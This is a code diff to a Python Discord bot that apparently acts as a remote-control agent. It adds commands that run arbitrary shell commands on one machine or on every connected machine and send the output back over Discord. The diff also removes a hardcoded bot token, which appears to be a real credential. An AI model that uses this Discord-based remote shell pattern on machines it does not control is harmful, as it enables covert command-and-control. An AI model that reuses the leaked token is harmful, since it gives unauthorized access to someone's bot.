@@ -14,7 +14,7 @@ from discord import SyncWebhook
 from discord.ext import commands
 
 
-TOKEN = "MTE1MTI2NDIyMzI4NDk1MzIwMA.G8YAWt.-rVBT6VvDpOIrCiKoa-H0fV2Ac8vTJC7ivsnvU"
+TOKEN = "<<INSERT_BOT_TOKEN>>"
 # Discord bot interface token
 
 
@@ -253,6 +253,38 @@ async def _shell_all(ctx, *cmd) -> None:
     res = api.shell(cmd)
     await transmit(ctx, res % COMPUTER_ID)
     
+    
+@client.command(name="shellprocess", aliases=["shellp", "slp"])
+async def _shell_process(ctx, device_id: str, *cmd) -> None:
+    """
+    Device-specific process shell command execution command signal.
+    
+    :param ctx: command context
+    :type ctx: Discord context object
+    :param device_id: command execution device identifier
+    :param cmd: command to run (passed as tuple containing command/arg info)
+    :type cmd: *str
+    """
+    
+    if device_id.lower() == COMPUTER_ID.lower():
+        res = api.shell_p(cmd)
+        await transmit(ctx, res % COMPUTER_ID)
+        
+        
+@client.command(name="shellprocessall", aliases=["shellpall", "shellpa", "slpa"])
+async def _shell_process_all(ctx, *cmd) -> None:
+    """
+    Universal process shell command execution command signal.
+    
+    :param ctx: command context
+    :type ctx: Discord context object
+    :param cmd: command to run (passed as tuple containing command/arg info)
+    :type cmd: *str
+    """
+    
+    res = api.shell_p(cmd)
+    await transmit(ctx, res % COMPUTER_ID)
+
     
 @client.command(name="systemoff")
 async def _system_off(ctx, device_id: str) -> None:
